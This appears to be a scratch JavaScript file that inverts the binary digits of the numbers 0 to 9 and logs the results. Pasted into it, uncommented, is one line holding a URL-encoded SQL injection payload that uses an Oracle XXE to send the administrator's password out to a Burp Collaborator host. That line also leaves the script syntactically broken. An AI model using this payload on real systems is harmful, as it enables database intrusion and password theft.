let x = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]

// 1 0 3 2 7 6 

/*

 1 + 1 = 2 
 
 1+ 3 = 4  

*/ 

x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.mnd0p7mv2ohu8cpljzkw2o86rxxold.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--.


function toParallexWorld() {

    for (let k = 0; k < x.length; k++) {

        let y = x[k].toString(2)

        let i;
        let r = "";
        for (i = 0; i < y.length; i++) {

            r += convert(y[i])
        }
        console.log(x[k], " : ", parseInt(r, 2).toString(10));

    }
}
    function convert(input) {

        //console.log("input : " , input );

        if (input == 1)

            return 0
        else return 1;
    }

    toParallexWorld()